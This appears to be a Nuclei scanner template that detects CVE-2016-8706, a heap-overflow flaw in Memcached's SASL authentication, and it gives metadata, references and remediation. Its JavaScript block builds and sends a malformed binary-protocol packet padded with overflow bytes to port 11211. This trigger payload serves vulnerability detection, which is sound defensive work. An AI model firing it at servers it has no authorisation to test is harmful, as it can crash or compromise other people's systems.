id: CVE-2016-8706
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:memcached:memcached:*:*:*:*:*:*:*:*
    cve-id: CVE-2016-8706
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-190
    epss-percentile: 0.9855
    epss-score: 0.68629
  description: 'An integer overflow in process_bin_sasl_auth function in Memcached,
    which is responsible for authentication commands of Memcached binary protocol,
    can be abused to cause heap overflow and lead to remote code execution.

    '
  impact: 'Attackers can trigger heap overflow in the SASL authentication function,
    potentially achieving remote code execution on Memcached servers.

    '
  metadata:
    max-request: 1
    product: memcached
    vendor: memcached
    verfied: true
  name: Memcached Server SASL Authentication - Remote Code Execution
  reference:
  - https://github.com/Medicean/VulApps/blob/master/m/memcached/cve-2016-8706/poc.py
  - https://nvd.nist.gov/vuln/detail/CVE-2016-8706
  - http://rhn.redhat.com/errata/RHSA-2016-2819.html
  - http://www.debian.org/security/2016/dsa-3704
  - http://www.securitytracker.com/id/1037333
  remediation: 'Upgrade Memcached to a version later than affected releases that properly
    handles integer overflow in SASL authentication.

    '
  severity: high
  tags: cve,cve2016,rce,js,memcached,vuln
javascript:
- args:
    Host: '{{Host}}'
    Port: 11211
  code: 'let packet = bytes.NewBuffer();

    packet.Write(new Uint8Array([0x80, 0x21]))

    let cmd = ''stats''

    packet.WriteString(cmd)

    packet.Pack("!H", [32]);

    packet.Pack("!I", [1]);

    let buzz = Array(1000).fill("A").join('''');

    packet.WriteString(buzz)

    const c = require("nuclei/net");

    let conn = c.Open(''tcp'', `${Host}:${Port}`);

    conn.SendHex(packet.Hex());

    conn.RecvString();

    '
  matchers:
  - type: word
    words:
    - Invalid arguments
  - negative: true
    type: word
    words:
    - Auth failure
  matchers-condition: and
  pre-condition: 'isPortOpen(Host,Port);

    '
